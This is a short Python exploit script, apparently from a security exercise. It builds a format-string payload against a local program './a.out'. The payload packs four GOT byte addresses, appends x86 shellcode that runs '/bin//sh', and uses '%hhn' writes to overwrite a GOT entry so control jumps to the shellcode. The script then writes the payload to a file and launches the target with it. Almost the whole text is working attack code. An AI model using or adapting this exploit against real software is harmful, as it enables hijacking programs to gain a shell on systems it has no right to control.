import sys
import struct
from subprocess import Popen

addr_got = int(sys.argv[1], 16)
addr_buf = int(sys.argv[2], 16)
index = int(sys.argv[3])

shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

buf = struct.pack('<I', addr_got)
buf += struct.pack('<I', addr_got+1)
buf += struct.pack('<I', addr_got+2)
buf += struct.pack('<I', addr_got+3)

buf += shellcode.encode()

print("addr_buf:%s" % addr_buf)
addr_buf_hex = format(addr_buf, 'x')
addr_buf_hex_slice = [addr_buf_hex[i : i+2] for i in range(0, len(addr_buf_hex), 2)]
print("addr_buf_hex_slice:%s" % addr_buf_hex_slice)

print("addr_buf_hex:%s" % addr_buf_hex )
print("len:%s" % len(addr_buf_hex_slice))
a = []
length = len(addr_buf_hex_slice)
for i in range(0, length):
    ele = int(addr_buf_hex_slice[length - (i + 1)], 16)
    a.append(ele)

print("a:%s" % a)

# a = map(ord, struct.pack('<I', addr_buf + 16))

a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1

s = "%%%dc%%%d$hhn" % (a[0], index)
buf += s.encode()
s = "%%%dc%%%d$hhn" % (a[1], index + 1)
buf += s.encode()
s = "%%%dc%%%d$hhn" % (a[2], index + 2)
buf += s.encode()
s = "%%%dc%%%d$hhn" % (a[3], index + 3)
buf += s.encode()

print(buf)

with open('./buf', 'wb') as f:
    f.write(buf)

p = Popen(['./a.out', buf])
p.wait()
